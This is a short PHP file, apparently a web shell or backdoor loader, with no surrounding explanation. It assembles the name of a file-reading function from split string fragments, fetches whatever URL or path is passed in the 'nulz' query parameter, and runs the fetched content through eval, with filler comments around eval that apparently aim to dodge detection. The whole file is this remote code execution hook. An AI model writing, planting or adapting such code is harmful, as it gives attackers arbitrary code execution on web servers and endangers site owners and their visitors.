<?php
$f_get = 'f'.'i'.'l'.'e_'.'ge'.'t_'.'co'.'nt'.'en'.'ts';
$this_f = '';

if (function_exists($f_get)) {
    if (isset($_GET['nulz'])) {
        $get_f = $_GET['nulz'];
        $this_f = $f_get($get_f);
    }
} else {
    $this_f = "<?='Cant Remote This Site.'?>";
}

/*555555*/eval/*555555*/("?>".$this_f)/****#****/;
